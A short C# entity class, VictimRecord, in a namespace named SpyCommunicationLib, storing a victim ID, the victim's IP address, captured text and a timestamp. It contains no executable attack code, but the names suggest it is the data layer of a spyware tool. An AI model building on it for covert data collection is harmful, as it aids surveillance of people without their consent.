﻿
namespace SpyCommunicationLib.Entities
{
    /// <summary>
    /// Represents a record related to a victim, including ID, IP, text data, and date.
    /// </summary>
    public class VictimRecord
    {
        /// <summary>
        /// Gets or sets the unique identifier of the record.
        /// </summary>
        public int Id { get; set; }

        /// <summary>
        /// Gets or sets the victim's identifier.
        /// </summary>
        public string VictimId { get; set; }

        /// <summary>
        /// Gets or sets the victim's IP address.
        /// </summary>
        public string VictimIp { get; set; }

        /// <summary>
        /// Gets or sets the content or message text of the record.
        /// </summary>
        public string Text { get; set; }

        /// <summary>
        /// Gets or sets the date and time when the record was created.
        /// </summary>
        public DateTime Date { get; set; }
    }
}
